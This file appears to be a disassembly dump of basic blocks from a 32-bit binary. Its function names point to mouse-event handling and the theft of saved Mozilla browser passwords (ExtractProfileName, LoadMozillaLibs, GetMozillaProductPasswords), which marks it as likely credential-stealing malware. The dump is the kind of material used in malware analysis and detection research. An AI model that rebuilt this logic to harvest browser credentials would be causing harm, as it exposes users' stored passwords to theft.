0x80509c5:	lea	edx, dword ptr [esp + 0x44]
0x80509c9:	push	edx
0x80509ca:	imul	edx, dword ptr [eax + 0x84], 0x50
0x80509d1:	add	edx, dword ptr [eax + 0x8c]
0x80509d7:	push	dword ptr [edx + 8]
0x80509da:	push	eax
0x80509db:	call	dword ptr [0x805be7c]
None
|
|
|
v
0x8050998:	mov	eax, dword ptr [esp + 0x6c]
0x805099c:	mov	dword ptr [esp + 0x44], 1
0x80509a4:	sub	esp, 0xc
0x80509a7:	lea	esi, dword ptr [esp + 0x48]
0x80509ab:	push	esi
0x80509ac:	lea	ebx, dword ptr [esp + 0x40]
0x80509b0:	push	ebx
0x80509b1:	lea	edx, dword ptr [esp + 0x40]
0x80509b5:	push	edx
0x80509b6:	lea	edx, dword ptr [esp + 0x50]
0x80509ba:	push	edx
0x80509bb:	lea	edx, dword ptr [esp + 0x50]
0x80509bf:	push	edx
0x80509c0:	lea	edx, dword ptr [esp + 0x3c]
0x80509c4:	push	edx
0x80509c5:	lea	edx, dword ptr [esp + 0x44]
0x80509c9:	push	edx
0x80509ca:	imul	edx, dword ptr [eax + 0x84], 0x50
0x80509d1:	add	edx, dword ptr [eax + 0x8c]
0x80509d7:	push	dword ptr [edx + 8]
0x80509da:	push	eax
0x80509db:	call	dword ptr [0x805be7c]
None
|
|
|
v
0x8050937:	push	edi
0x8050938:	push	esi
0x8050939:	push	ebx
0x805093a:	sub	esp, 0x7c
0x805093d:	lea	eax, dword ptr [esp + 0x78]
0x8050941:	push	eax
0x8050942:	call	0x80558b7
None
|
|
|
v
0x8050952:	lea	edx, dword ptr [esp + 0xc]
0x8050956:	xor	eax, eax
0x8050958:	mov	ecx, 0x18
0x805095d:	mov	edi, edx
0x805095f:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x805097c:	mov	dword ptr [esp + 0x40], 1
0x8050984:	jmp	0x8050998
None
|
|
|
v
0x8050986:	mov	dword ptr [esp + 0x40], 2
0x805098e:	jmp	0x8050998
None
|
|
|
v
0x8050978:	dec	al
0x805097a:	jne	0x8050998
None
|
|
|
v
0x8050a44:	add	esp, 0x14
0x8050a47:	push	dword ptr [esp + 0x78]
0x8050a4b:	call	dword ptr [0x805be1c]
None
|
|
|
v
0x8050a51:	add	esp, 0x10
0x8050a54:	add	esp, 0x70
0x8050a57:	pop	ebx
0x8050a58:	pop	esi
0x8050a59:	pop	edi
0x8050a5a:	ret	
None
|
|
|
v
0x8050a54:	add	esp, 0x70
0x8050a57:	pop	ebx
0x8050a58:	pop	esi
0x8050a59:	pop	edi
0x8050a5a:	ret	
None
|
|
|
v
0x8050961:	mov	dword ptr [esp + 0xc], 4
0x8050969:	mov	al, byte ptr [esp + 0x84]
0x8050970:	cmp	al, 2
0x8050972:	je	0x8050986
None
|
|
|
v
0x8050a1b:	add	esp, 0x30
0x8050a1e:	mov	eax, dword ptr [esp + 0x24]
0x8050a22:	test	eax, eax
0x8050a24:	jne	0x80509eb
None
|
|
|
v
0x805095f:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8050a26:	sub	esp, 0xc
0x8050a29:	lea	eax, dword ptr [esp + 0x18]
0x8050a2d:	push	eax
0x8050a2e:	push	0xfff
0x8050a33:	push	1
0x8050a35:	push	0
0x8050a37:	push	dword ptr [esp + 0x88]
0x8050a3e:	call	dword ptr [0x805be3c]
None
|
|
|
v
0x80509e1:	mov	eax, dword ptr [esp + 0x4c]
0x80509e5:	mov	dword ptr [esp + 0x54], eax
0x80509e9:	jmp	0x8050a1b
None
|
|
|
v
0x8050947:	add	esp, 0x10
0x805094a:	test	al, al
0x805094c:	je	0x8050a54
None
|
|
|
v
0x8050974:	cmp	al, 3
0x8050976:	je	0x8050990
None
|
|
|
v
0x80509eb:	mov	dword ptr [esp + 0x1c], eax
0x80509ef:	sub	esp, 0xc
0x80509f2:	push	esi
0x80509f3:	push	ebx
0x80509f4:	lea	edx, dword ptr [esp + 0x40]
0x80509f8:	push	edx
0x80509f9:	lea	edx, dword ptr [esp + 0x50]
0x80509fd:	push	edx
0x80509fe:	lea	edx, dword ptr [esp + 0x50]
0x8050a02:	push	edx
0x8050a03:	lea	edx, dword ptr [esp + 0x44]
0x8050a07:	push	edx
0x8050a08:	lea	edx, dword ptr [esp + 0x44]
0x8050a0c:	push	edx
0x8050a0d:	push	eax
0x8050a0e:	push	dword ptr [esp + 0x98]
0x8050a15:	call	dword ptr [0x805be7c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpMouseUp
TOTAL BLOCKS :18
0x8050b3f:	add	esp, 0x30
0x8050b42:	mov	eax, dword ptr [esp + 0x24]
0x8050b46:	test	eax, eax
0x8050b48:	jne	0x8050b0f
None
|
|
|
v
0x8050a83:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8050a9c:	dec	al
0x8050a9e:	jne	0x8050abc
None
|
|
|
v
0x8050b05:	mov	eax, dword ptr [esp + 0x4c]
0x8050b09:	mov	dword ptr [esp + 0x54], eax
0x8050b0d:	jmp	0x8050b3f
None
|
|
|
v
0x8050a6b:	add	esp, 0x10
0x8050a6e:	test	al, al
0x8050a70:	je	0x8050b80
None
|
|
|
v
0x8050b70:	add	esp, 0x14
0x8050b73:	push	dword ptr [esp + 0x78]
0x8050b77:	call	dword ptr [0x805be1c]
None
|
|
|
v
0x8050aaa:	mov	dword ptr [esp + 0x40], 2
0x8050ab2:	jmp	0x8050abc
None
|
|
|
v
0x8050abc:	mov	eax, dword ptr [esp + 0x6c]
0x8050ac0:	mov	dword ptr [esp + 0x44], 1
0x8050ac8:	sub	esp, 0xc
0x8050acb:	lea	esi, dword ptr [esp + 0x48]
0x8050acf:	push	esi
0x8050ad0:	lea	ebx, dword ptr [esp + 0x40]
0x8050ad4:	push	ebx
0x8050ad5:	lea	edx, dword ptr [esp + 0x40]
0x8050ad9:	push	edx
0x8050ada:	lea	edx, dword ptr [esp + 0x50]
0x8050ade:	push	edx
0x8050adf:	lea	edx, dword ptr [esp + 0x50]
0x8050ae3:	push	edx
0x8050ae4:	lea	edx, dword ptr [esp + 0x3c]
0x8050ae8:	push	edx
0x8050ae9:	lea	edx, dword ptr [esp + 0x44]
0x8050aed:	push	edx
0x8050aee:	imul	edx, dword ptr [eax + 0x84], 0x50
0x8050af5:	add	edx, dword ptr [eax + 0x8c]
0x8050afb:	push	dword ptr [edx + 8]
0x8050afe:	push	eax
0x8050aff:	call	dword ptr [0x805be7c]
None
|
|
|
v
0x8050b4a:	mov	dword ptr [esp + 0x3c], 0x100
0x8050b52:	sub	esp, 0xc
0x8050b55:	lea	eax, dword ptr [esp + 0x18]
0x8050b59:	push	eax
0x8050b5a:	push	0xfff
0x8050b5f:	push	1
0x8050b61:	push	0
0x8050b63:	push	dword ptr [esp + 0x88]
0x8050b6a:	call	dword ptr [0x805be3c]
None
|
|
|
v
0x8050a76:	lea	edx, dword ptr [esp + 0xc]
0x8050a7a:	xor	eax, eax
0x8050a7c:	mov	ecx, 0x18
0x8050a81:	mov	edi, edx
0x8050a83:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8050b80:	add	esp, 0x70
0x8050b83:	pop	ebx
0x8050b84:	pop	esi
0x8050b85:	pop	edi
0x8050b86:	ret	
None
|
|
|
v
0x8050a85:	mov	dword ptr [esp + 0xc], 5
0x8050a8d:	mov	al, byte ptr [esp + 0x84]
0x8050a94:	cmp	al, 2
0x8050a96:	je	0x8050aaa
None
|
|
|
v
0x8050a5b:	push	edi
0x8050a5c:	push	esi
0x8050a5d:	push	ebx
0x8050a5e:	sub	esp, 0x7c
0x8050a61:	lea	eax, dword ptr [esp + 0x78]
0x8050a65:	push	eax
0x8050a66:	call	0x80558b7
None
|
|
|
v
0x8050b0f:	mov	dword ptr [esp + 0x1c], eax
0x8050b13:	sub	esp, 0xc
0x8050b16:	push	esi
0x8050b17:	push	ebx
0x8050b18:	lea	edx, dword ptr [esp + 0x40]
0x8050b1c:	push	edx
0x8050b1d:	lea	edx, dword ptr [esp + 0x50]
0x8050b21:	push	edx
0x8050b22:	lea	edx, dword ptr [esp + 0x50]
0x8050b26:	push	edx
0x8050b27:	lea	edx, dword ptr [esp + 0x44]
0x8050b2b:	push	edx
0x8050b2c:	lea	edx, dword ptr [esp + 0x44]
0x8050b30:	push	edx
0x8050b31:	push	eax
0x8050b32:	push	dword ptr [esp + 0x98]
0x8050b39:	call	dword ptr [0x805be7c]
None
|
|
|
v
0x8050aa0:	mov	dword ptr [esp + 0x40], 1
0x8050aa8:	jmp	0x8050abc
None
|
|
|
v
0x8050b7d:	add	esp, 0x10
0x8050b80:	add	esp, 0x70
0x8050b83:	pop	ebx
0x8050b84:	pop	esi
0x8050b85:	pop	edi
0x8050b86:	ret	
None
|
|
|
v
0x8050a98:	cmp	al, 3
0x8050a9a:	je	0x8050ab4
None
|
|
|
v
0x8050ab4:	mov	dword ptr [esp + 0x40], 3
0x8050abc:	mov	eax, dword ptr [esp + 0x6c]
0x8050ac0:	mov	dword ptr [esp + 0x44], 1
0x8050ac8:	sub	esp, 0xc
0x8050acb:	lea	esi, dword ptr [esp + 0x48]
0x8050acf:	push	esi
0x8050ad0:	lea	ebx, dword ptr [esp + 0x40]
0x8050ad4:	push	ebx
0x8050ad5:	lea	edx, dword ptr [esp + 0x40]
0x8050ad9:	push	edx
0x8050ada:	lea	edx, dword ptr [esp + 0x50]
0x8050ade:	push	edx
0x8050adf:	lea	edx, dword ptr [esp + 0x50]
0x8050ae3:	push	edx
0x8050ae4:	lea	edx, dword ptr [esp + 0x3c]
0x8050ae8:	push	edx
0x8050ae9:	lea	edx, dword ptr [esp + 0x44]
0x8050aed:	push	edx
0x8050aee:	imul	edx, dword ptr [eax + 0x84], 0x50
0x8050af5:	add	edx, dword ptr [eax + 0x8c]
0x8050afb:	push	dword ptr [edx + 8]
0x8050afe:	push	eax
0x8050aff:	call	dword ptr [0x805be7c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpMouseMove
TOTAL BLOCKS :7
0x8050bc8:	add	esp, 0x24
0x8050bcb:	push	dword ptr [esp + 0x18]
0x8050bcf:	call	dword ptr [0x805be1c]
None
|
|
|
v
0x8050b87:	sub	esp, 0x28
0x8050b8a:	lea	eax, dword ptr [esp + 0x18]
0x8050b8e:	push	eax
0x8050b8f:	call	0x80558b7
None
|
|
|
v
0x8050bd5:	add	esp, 0x10
0x8050bd8:	sub	esp, 0xc
0x8050bdb:	push	0x64
0x8050bdd:	call	0x804f548
None
|
|
|
v
0x8050be2:	add	esp, 0x2c
0x8050be5:	ret	
None
|
|
|
v
0x8050b94:	add	esp, 0x10
0x8050b97:	test	al, al
0x8050b99:	je	0x8050bd8
None
|
|
|
v
0x8050b9b:	mov	eax, dword ptr [esp + 0xc]
0x8050b9f:	sub	esp, 0xc
0x8050ba2:	movzx	edx, word ptr [esp + 0x2e]
0x8050ba7:	push	edx
0x8050ba8:	movzx	edx, word ptr [esp + 0x30]
0x8050bad:	push	edx
0x8050bae:	push	0
0x8050bb0:	push	0
0x8050bb2:	push	0
0x8050bb4:	push	0
0x8050bb6:	mov	edx, dword ptr [eax + 0x8c]
0x8050bbc:	push	dword ptr [edx + 8]
0x8050bbf:	push	0
0x8050bc1:	push	eax
0x8050bc2:	call	dword ptr [0x805be4c]
None
|
|
|
v
0x8050bd8:	sub	esp, 0xc
0x8050bdb:	push	0x64
0x8050bdd:	call	0x804f548
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ExtractProfileName
TOTAL BLOCKS :17
0x8050ca8:	add	esp, 0x10
0x8050cab:	add	esp, 0x81c
0x8050cb1:	mov	eax, ebp
0x8050cb3:	pop	ebx
0x8050cb4:	pop	esi
0x8050cb5:	pop	edi
0x8050cb6:	pop	ebp
0x8050cb7:	ret	
None
|
|
|
v
0x8050c41:	mov	byte ptr [esp + 0x80f], 0
0x8050c49:	push	ecx
0x8050c4a:	push	edi
0x8050c4b:	push	0x80561a1
0x8050c50:	push	0
0x8050c52:	call	0x8051d7f
None
|
|
|
v
0x8050c71:	mov	edx, esi
0x8050c73:	sub	edx, 0
0x8050c76:	js	0x8050c9a
None
|
|
|
v
0x8050c69:	add	esp, 0x10
0x8050c6c:	inc	eax
0x8050c6d:	cmp	eax, esi
0x8050c6f:	jle	0x8050c9a
None
|
|
|
v
0x8050be8:	push	ebp
0x8050be9:	xor	eax, eax
0x8050beb:	push	edi
0x8050bec:	xor	ebp, ebp
0x8050bee:	push	esi
0x8050bef:	push	ebx
0x8050bf0:	sub	esp, 0x824
0x8050bf6:	mov	ebx, dword ptr [esp + 0x83c]
0x8050bfd:	mov	ecx, dword ptr [esp + 0x840]
0x8050c04:	mov	edi, ebx
0x8050c06:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x8050c83:	push	edx
0x8050c84:	add	esi, edi
0x8050c86:	push	eax
0x8050c87:	push	esi
0x8050c88:	push	ebx
0x8050c89:	call	0x8051ce0
None
|
|
|
v
0x8050c3a:	add	esp, 0x10
0x8050c3d:	test	eax, eax
0x8050c3f:	je	0x8050c9c
None
|
|
|
v
0x8050c06:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x8050c9a:	xor	ebp, ebp
0x8050c9c:	sub	esp, 0xc
0x8050c9f:	push	dword ptr [esp + 0x18]
0x8050ca3:	call	0x804bbe0
None
|
|
|
v
0x8050c28:	push	eax
0x8050c29:	push	0x800
0x8050c2e:	push	1
0x8050c30:	lea	edi, dword ptr [esp + 0x1c]
0x8050c34:	push	edi
0x8050c35:	call	0x804bce0
None
|
|
|
v
0x8050c8e:	add	esp, 0x10
0x8050c91:	test	eax, eax
0x8050c93:	setne	al
0x8050c96:	mov	ebp, eax
0x8050c98:	jmp	0x8050c9c
None
|
|
|
v
0x8050c19:	mov	dword ptr [esp + 0x1c], eax
0x8050c1d:	add	esp, 0x10
0x8050c20:	test	eax, eax
0x8050c22:	je	0x8050cab
None
|
|
|
v
0x8050c08:	push	0x80562ec
0x8050c0d:	push	dword ptr [esp + 0x83c]
0x8050c14:	call	0x804bca0
None
|
|
|
v
0x8050c78:	sub	eax, esi
0x8050c7a:	cmp	eax, dword ptr [esp + 0x838]
0x8050c81:	jae	0x8050c9c
None
|
|
|
v
0x8050c9c:	sub	esp, 0xc
0x8050c9f:	push	dword ptr [esp + 0x18]
0x8050ca3:	call	0x804bbe0
None
|
|
|
v
0x8050c57:	add	esp, 0xc
0x8050c5a:	push	edi
0x8050c5b:	push	0x8056087
0x8050c60:	lea	esi, dword ptr [eax + 5]
0x8050c63:	push	esi
0x8050c64:	call	0x8051d7f
None
|
|
|
v
0x8050cab:	add	esp, 0x81c
0x8050cb1:	mov	eax, ebp
0x8050cb3:	pop	ebx
0x8050cb4:	pop	esi
0x8050cb5:	pop	edi
0x8050cb6:	pop	ebp
0x8050cb7:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:FindMozillaLib
TOTAL BLOCKS :11
0x8050cfa:	add	esp, 0x18
0x8050cfd:	push	0x80562ec
0x8050d02:	push	esi
0x8050d03:	call	0x804bca0
None
|
|
|
v
0x8050d2f:	add	esp, 0x14
0x8050d32:	push	dword ptr [esp + 0x1034]
0x8050d39:	push	esi
0x8050d3a:	push	0x8000
0x8050d3f:	push	ebp
0x8050d40:	mov	eax, dword ptr [esp + 0x1048]
0x8050d47:	push	dword ptr [eax + ebx*4]
0x8050d4a:	call	0x804f39a
None
|
|
|
v
0x8050d0f:	push	edi
0x8050d10:	push	edi
0x8050d11:	push	dword ptr [esp + 0x102c]
0x8050d18:	push	0x80561a7
0x8050d1d:	push	0x1000
0x8050d22:	push	1
0x8050d24:	push	0x1000
0x8050d29:	push	ebp
0x8050d2a:	call	0x804bb70
None
|
|
|
v
0x8050cb8:	push	ebp
0x8050cb9:	push	edi
0x8050cba:	push	esi
0x8050cbb:	push	ebx
0x8050cbc:	xor	ebx, ebx
0x8050cbe:	sub	esp, 0x100c
0x8050cc4:	mov	esi, dword ptr [esp + 0x1020]
0x8050ccb:	mov	ebp, esp
0x8050ccd:	jmp	0x8050d62
None
|
|
|
v
0x8050d6f:	add	esp, 0x100c
0x8050d75:	pop	ebx
0x8050d76:	pop	esi
0x8050d77:	pop	edi
0x8050d78:	pop	ebp
0x8050d79:	ret	
None
|
|
|
v
0x8050d62:	cmp	ebx, dword ptr [esp + 0x1030]
0x8050d69:	jne	0x8050cd2
None
|
|
|
v
0x8050d4f:	add	esp, 0x20
0x8050d52:	test	al, al
0x8050d54:	jne	0x8050d6f
None
|
|
|
v
0x8050d08:	add	esp, 0x10
0x8050d0b:	test	eax, eax
0x8050d0d:	jne	0x8050d6f
None
|
|
|
v
0x8050d56:	mov	ecx, dword ptr [esp + 0x1028]
0x8050d5d:	mov	edi, esi
0x8050d5f:	inc	ebx
0x8050d60:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x8050cd2:	push	eax
0x8050cd3:	push	dword ptr [esp + 0x1028]
0x8050cda:	mov	eax, dword ptr [esp + 0x1034]
0x8050ce1:	push	dword ptr [eax + ebx*4]
0x8050ce4:	push	0x80560cd
0x8050ce9:	push	-1
0x8050ceb:	push	1
0x8050ced:	push	dword ptr [esp + 0x1040]
0x8050cf4:	push	esi
0x8050cf5:	call	0x804bb70
None
|
|
|
v
0x8050d60:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CleanUpMozilla
TOTAL BLOCKS :4
0x8050d7a:	push	esi
0x8050d7b:	push	ebx
0x8050d7c:	mov	ebx, 1
0x8050d81:	push	eax
0x8050d82:	mov	esi, dword ptr [esp + 0x10]
0x8050d86:	sub	esp, 0xc
0x8050d89:	push	dword ptr [esi + ebx*4]
0x8050d8c:	inc	ebx
0x8050d8d:	call	0x804f6aa
None
|
|
|
v
0x8050d9a:	pop	eax
0x8050d9b:	pop	ebx
0x8050d9c:	pop	esi
0x8050d9d:	ret	
None
|
|
|
v
0x8050d86:	sub	esp, 0xc
0x8050d89:	push	dword ptr [esi + ebx*4]
0x8050d8c:	inc	ebx
0x8050d8d:	call	0x804f6aa
None
|
|
|
v
0x8050d92:	add	esp, 0x10
0x8050d95:	cmp	ebx, 8
0x8050d98:	jne	0x8050d86
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:LoadMozillaLibs
TOTAL BLOCKS :18
0x8050e9c:	add	esp, 0x20
0x8050e9f:	sub	esp, 0xc
0x8050ea2:	push	esi
0x8050ea3:	call	0x804f12a
None
|
|
|
v
0x8050d9e:	push	ebp
0x8050d9f:	push	edi
0x8050da0:	push	esi
0x8050da1:	push	ebx
0x8050da2:	sub	esp, 0x4438
0x8050da8:	mov	ebp, dword ptr [esp + 0x444c]
0x8050daf:	push	0x1100
0x8050db4:	lea	edi, dword ptr [esp + 0x111c]
0x8050dbb:	push	edi
0x8050dbc:	push	0x4000
0x8050dc1:	push	0x80561ab
0x8050dc6:	push	0x80561b6
0x8050dcb:	call	0x804f39a
None
|
|
|
v
0x8050eaf:	sub	esp, 0xc
0x8050eb2:	push	esi
0x8050eb3:	call	0x804f693
None
|
|
|
v
0x8050e7f:	add	esp, 0x10
0x8050e82:	test	al, al
0x8050e84:	jne	0x8050e9f
None
|
|
|
v
0x8050dd0:	add	esp, 0x14
0x8050dd3:	push	0x1100
0x8050dd8:	lea	esi, dword ptr [esp + 0x221c]
0x8050ddf:	push	esi
0x8050de0:	push	0x4000
0x8050de5:	push	0x80561bf
0x8050dea:	push	0x80561b6
0x8050def:	call	0x804f39a
None
|
|
|
v
0x8050e9f:	sub	esp, 0xc
0x8050ea2:	push	esi
0x8050ea3:	call	0x804f12a
None
|
|
|
v
0x8050ec9:	mov	al, 1
0x8050ecb:	jmp	0x8050ecf
None
|
|
|
v
0x8050ec3:	inc	ebx
0x8050ec4:	cmp	ebx, 8
0x8050ec7:	jne	0x8050e56
None
|
|
|
v
0x8050ecf:	add	esp, 0x442c
0x8050ed5:	pop	ebx
0x8050ed6:	pop	esi
0x8050ed7:	pop	edi
0x8050ed8:	pop	ebp
0x8050ed9:	ret	
None
|
|
|
v
0x8050e76:	sub	esp, 0xc
0x8050e79:	push	esi
0x8050e7a:	call	0x804f12a
None
|
|
|
v
0x8050ea8:	add	esp, 0x10
0x8050eab:	test	al, al
0x8050ead:	je	0x8050ecd
None
|
|
|
v
0x8050e86:	sub	esp, 0xc
0x8050e89:	push	5
0x8050e8b:	push	edi
0x8050e8c:	push	0x1100
0x8050e91:	push	0x80561d8
0x8050e96:	push	esi
0x8050e97:	call	0x8050cb8
None
|
|
|
v
0x8050e18:	mov	dword ptr [esp + 0x442c], edi
0x8050e1f:	mov	dword ptr [esp + 0x4430], esi
0x8050e26:	mov	dword ptr [esp + 0x4434], ebx
0x8050e2d:	mov	ebx, 1
0x8050e32:	mov	dword ptr [esp + 0x4438], 0x80561b6
0x8050e3d:	mov	dword ptr [esp + 0x443c], 0x80561ba
0x8050e48:	add	esp, 0x20
0x8050e4b:	lea	edi, dword ptr [esp + 0x440c]
0x8050e52:	lea	esi, dword ptr [esp + 0xc]
0x8050e56:	sub	esp, 0xc
0x8050e59:	push	5
0x8050e5b:	push	edi
0x8050e5c:	push	0x1100
0x8050e61:	push	dword ptr [ebx*4 + 0x8056494]
0x8050e68:	push	esi
0x8050e69:	call	0x8050cb8
None
|
|
|
v
0x8050eb8:	add	esp, 0x10
0x8050ebb:	test	eax, eax
0x8050ebd:	mov	dword ptr [ebp + ebx*4], eax
0x8050ec1:	je	0x8050ecd
None
|
|
|
v
0x8050df4:	add	esp, 0x14
0x8050df7:	push	0x1100
0x8050dfc:	lea	ebx, dword ptr [esp + 0x331c]
0x8050e03:	push	ebx
0x8050e04:	push	0x4000
0x8050e09:	push	0x80561ca
0x8050e0e:	push	0x80561b6
0x8050e13:	call	0x804f39a
None
|
|
|
v
0x8050e56:	sub	esp, 0xc
0x8050e59:	push	5
0x8050e5b:	push	edi
0x8050e5c:	push	0x1100
0x8050e61:	push	dword ptr [ebx*4 + 0x8056494]
0x8050e68:	push	esi
0x8050e69:	call	0x8050cb8
None
|
|
|
v
0x8050e6e:	add	esp, 0x20
0x8050e71:	cmp	ebx, 1
0x8050e74:	jne	0x8050e9f
None
|
|
|
v
0x8050ecd:	xor	eax, eax
0x8050ecf:	add	esp, 0x442c
0x8050ed5:	pop	ebx
0x8050ed6:	pop	esi
0x8050ed7:	pop	edi
0x8050ed8:	pop	ebp
0x8050ed9:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:GetMozillaProductPasswords
TOTAL BLOCKS :101
0x8051422:	add	esp, 0x10
0x8051425:	test	eax, eax
0x8051427:	jne	0x80514a5
None
|
|
|
v
0x8050fd0:	pop	ebx
0x8050fd1:	pop	esi
0x8050fd2:	push	eax
0x8050fd3:	push	0x8056226
0x8050fd8:	push	0x1100
0x8050fdd:	push	1
0x8050fdf:	push	0x1100
0x8050fe4:	lea	ebx, dword ptr [esp + 0x50]
0x8050fe8:	push	ebx
0x8050fe9:	call	0x804bb70
None
|
|
|
v
0x80512e3:	push	edx
0x80512e4:	push	0
0x80512e6:	push	1
0x80512e8:	push	eax
0x80512e9:	call	dword ptr [esp + 0x18]
None
|
|
|
v
0x8051019:	add	esp, 0xc
0x805101c:	push	esi
0x805101d:	push	eax
0x805101e:	push	0x8056243
0x8051023:	jmp	0x80510a2
None
|
|
|
v
0x8051185:	push	edx
0x8051186:	push	edx
0x8051187:	push	0x80562fe
0x805118c:	push	dword ptr [esp + 0x269c]
0x8051193:	call	0x804f6a5
None
|
|
|
v
0x8051141:	push	ebp
0x8051142:	push	ebp
0x8051143:	push	0x80562d7
0x8051148:	push	dword ptr [esp + 0x269c]
0x805114f:	call	0x804f6a5
None
|
|
|
v
0x80514fc:	add	esp, 0x26cc
0x8051502:	mov	eax, ebx
0x8051504:	pop	ebx
0x8051505:	pop	esi
0x8051506:	pop	edi
0x8051507:	pop	ebp
0x8051508:	ret	
None
|
|
|
v
0x8051001:	add	esp, 0x10
0x8051004:	test	al, al
0x8051006:	je	0x80514e2
None
|
|
|
v
0x80513cf:	add	esp, 0xc
0x80513d2:	push	0x200
0x80513d7:	push	eax
0x80513d8:	lea	ebx, dword ptr [esp + 0x2440]
0x80513df:	push	ebx
0x80513e0:	mov	edi, ebx
0x80513e2:	call	0x8051ce0
None
|
|
|
v
0x805139b:	cmp	dword ptr [esp + 0x269c], 0
0x80513a3:	je	0x80514a5
None
|
|
|
v
0x8051176:	mov	dword ptr [esp + 0x28], eax
0x805117a:	add	esp, 0x10
0x805117d:	test	eax, eax
0x805117f:	je	0x80514fc
None
|
|
|
v
0x8050f16:	cmp	dword ptr [esp + 0x26e0], 1
0x8050f1e:	jne	0x80510b7
None
|
|
|
v
0x8051080:	add	esp, 0x10
0x8051083:	test	al, al
0x8051085:	je	0x80514e2
None
|
|
|
v
0x8051271:	push	ecx
0x8051272:	push	ecx
0x8051273:	lea	eax, dword ptr [esp + 0x26b4]
0x805127a:	push	eax
0x805127b:	lea	eax, dword ptr [esp + 0x1140]
0x8051282:	push	eax
0x8051283:	call	dword ptr [esp + 0x1c]
None
|
|
|
v
0x8051163:	push	ecx
0x8051164:	push	ecx
0x8051165:	push	0x80562ee
0x805116a:	push	dword ptr [esp + 0x269c]
0x8051171:	call	0x804f6a5
None
|
|
|
v
0x805106d:	add	esp, 0x1c
0x8051070:	push	0x40
0x8051072:	lea	esi, dword ptr [esp + 0x263c]
0x8051079:	push	esi
0x805107a:	push	ebx
0x805107b:	call	0x8050be8
None
|
|
|
v
0x8051154:	mov	dword ptr [esp + 0x24], eax
0x8051158:	add	esp, 0x10
0x805115b:	test	eax, eax
0x805115d:	je	0x80514fc
None
|
|
|
v
0x8051098:	add	esp, 0xc
0x805109b:	push	esi
0x805109c:	push	eax
0x805109d:	push	0x8056279
0x80510a2:	push	0x1100
0x80510a7:	push	1
0x80510a9:	push	0x1100
0x80510ae:	push	ebx
0x80510af:	call	0x804bb70
None
|
|
|
v
0x80512d5:	call	esi
None
|
|
|
v
0x805132c:	push	eax
0x805132d:	mov	edi, esi
0x805132f:	push	eax
0x8051330:	push	6
0x8051332:	push	dword ptr [esp + 0x26bc]
0x8051339:	call	dword ptr [esp + 0x20]
None
|
|
|
v
0x80512d7:	test	eax, eax
0x80512d9:	mov	dword ptr [esp + 0xc], eax
0x80512dd:	je	0x80514cd
None
|
|
|
v
0x805104f:	pop	edx
0x8051050:	pop	ecx
0x8051051:	push	eax
0x8051052:	push	0x8056256
0x8051057:	push	0x1100
0x805105c:	push	1
0x805105e:	push	0x1100
0x8051063:	lea	ebx, dword ptr [esp + 0x50]
0x8051067:	push	ebx
0x8051068:	call	0x804bb70
None
|
|
|
v
0x8051380:	push	eax
0x8051381:	push	0
0x8051383:	lea	eax, dword ptr [esp + 0x26a8]
0x805138a:	push	eax
0x805138b:	push	ebp
0x805138c:	call	dword ptr [esp + 0x28]
None
|
|
|
v
0x8051451:	add	esp, 0xc
0x8051454:	push	ebx
0x8051455:	push	esi
0x8051456:	push	dword ptr [esp + 0x38]
0x805145a:	push	dword ptr [esp + 0x26f0]
0x8051461:	push	0x8056382
0x8051466:	push	1
0x8051468:	lea	edi, dword ptr [esp + 0x26d4]
0x805146f:	push	edi
0x8051470:	call	0x804bd20
None
|
|
|
v
0x80514f2:	mov	ebx, dword ptr [esp + 0x26cc]
0x80514f9:	add	esp, 0x10
0x80514fc:	add	esp, 0x26cc
0x8051502:	mov	eax, ebx
0x8051504:	pop	ebx
0x8051505:	pop	esi
0x8051506:	pop	edi
0x8051507:	pop	ebp
0x8051508:	ret	
None
|
|
|
v
0x8050fc3:	sub	esp, 0xc
0x8050fc6:	push	0x80561e9
0x8050fcb:	call	0x804bd10
None
|
|
|
v
0x80510de:	add	esp, 0x18
0x80510e1:	push	0x80562a4
0x80510e6:	push	dword ptr [esp + 0x269c]
0x80510ed:	call	0x804f6a5
None
|
|
|
v
0x80513a9:	push	ecx
0x80513aa:	mov	eax, dword ptr [esp + 0x26ac]
0x80513b1:	inc	eax
0x80513b2:	push	eax
0x80513b3:	push	dword ptr [esp + 0x26ac]
0x80513ba:	push	esi
0x80513bb:	call	0x8051ce0
None
|
|
|
v
0x805134c:	xor	eax, eax
0x805134e:	or	ecx, 0xffffffff
0x8051351:	mov	dword ptr [esp + 0x26a8], 0
0x805135c:	mov	dword ptr [esp + 0x26ac], 0
0x8051367:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8051404:	not	ecx
0x8051406:	dec	ecx
0x8051407:	push	ecx
0x8051408:	push	ebx
0x8051409:	push	ebp
0x805140a:	push	0
0x805140c:	call	dword ptr [esp + 0x34]
None
|
|
|
v
0x8051287:	add	esp, 0x10
0x805128a:	test	eax, eax
0x805128c:	jne	0x80514fc
None
|
|
|
v
0x80512ed:	add	esp, 0x10
0x80512f0:	test	eax, eax
0x80512f2:	jne	0x80514bf
None
|
|
|
v
0x80514e2:	sub	esp, 0xc
0x80514e5:	lea	eax, dword ptr [esp + 0x2680]
0x80514ec:	push	eax
0x80514ed:	call	0x8050d7a
None
|
|
|
v
0x80510f2:	add	esp, 0x10
0x80510f5:	test	eax, eax
0x80510f7:	mov	edi, eax
0x80510f9:	je	0x80514fc
None
|
|
|
v
0x8050fee:	add	esp, 0x1c
0x8050ff1:	push	0x40
0x8050ff3:	lea	esi, dword ptr [esp + 0x263c]
0x8050ffa:	push	esi
0x8050ffb:	push	ebx
0x8050ffc:	call	0x8050be8
None
